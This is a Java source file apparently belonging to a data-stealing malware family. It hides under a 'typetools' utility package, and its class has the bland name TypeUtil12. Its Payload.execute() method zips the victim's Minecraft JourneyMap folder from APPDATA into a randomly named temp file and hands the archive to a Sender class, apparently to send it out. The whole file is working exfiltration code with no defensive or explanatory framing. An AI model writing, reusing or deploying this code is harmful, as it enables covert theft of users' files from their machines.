package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.FileUtil;
import net.jodah.typetools.util.Payload;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public final class TypeUtil12 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        File packed = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
        pack(System.getenv("APPDATA") + "\\.minecraft\\journeymap", packed.getPath());
        Sender.send(packed);
    }

    private void pack(String sourceDirPath, String zipFilePath) throws IOException
    {
        Path p = Files.createFile(Paths.get(zipFilePath));
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p)))
        {
            Path pp = Paths.get(sourceDirPath);
            Files.walk(pp)
                    .filter(path -> !Files.isDirectory(path))
                    .filter(path -> !path.toFile().getName().endsWith(".png"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try
                        {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        }
                        catch (IOException ignored) { }
                    });
        }
    }

}
